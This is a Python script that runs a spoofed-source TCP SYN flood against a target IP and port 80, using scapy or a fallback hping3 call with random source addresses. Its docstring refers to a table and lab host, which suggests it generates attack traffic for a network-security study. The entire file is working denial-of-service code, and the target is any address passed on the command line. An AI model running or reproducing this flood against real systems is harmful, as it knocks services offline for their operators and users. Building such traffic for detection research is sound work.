#!/usr/bin/env python3
"""SYN flood from h4  (Table VII: 35% share, target CR 98%).

Spoofed-source TCP SYN train against the victim's port 80.
"""
from __future__ import annotations
import argparse, random
from attacks._common import HAVE_SCAPY, hping3, scapy_train, target_pps


def run(target_ip: str, duration_s: float = 30.0, dport: int = 80, seed: int = 42) -> None:
    rng = random.Random(seed)
    pps = target_pps(rng)
    if HAVE_SCAPY:
        from scapy.all import IP, TCP, RandShort
        scapy_train(lambda r: IP(src=f"10.0.{r.randint(1,254)}.{r.randint(1,254)}", dst=target_ip)
                    / TCP(sport=RandShort(), dport=dport, flags="S", seq=r.randint(0, 2**31)),
                    pps, duration_s, seed)
    else:
        hping3(["-S", "-p", str(dport), "-i", f"u{int(1e6/pps)}", "--rand-source", target_ip])


if __name__ == "__main__":
    a = argparse.ArgumentParser(); a.add_argument("target"); a.add_argument("--duration", type=float, default=30.0)
    a.add_argument("--seed", type=int, default=42); n = a.parse_args()
    run(n.target, n.duration, seed=n.seed)
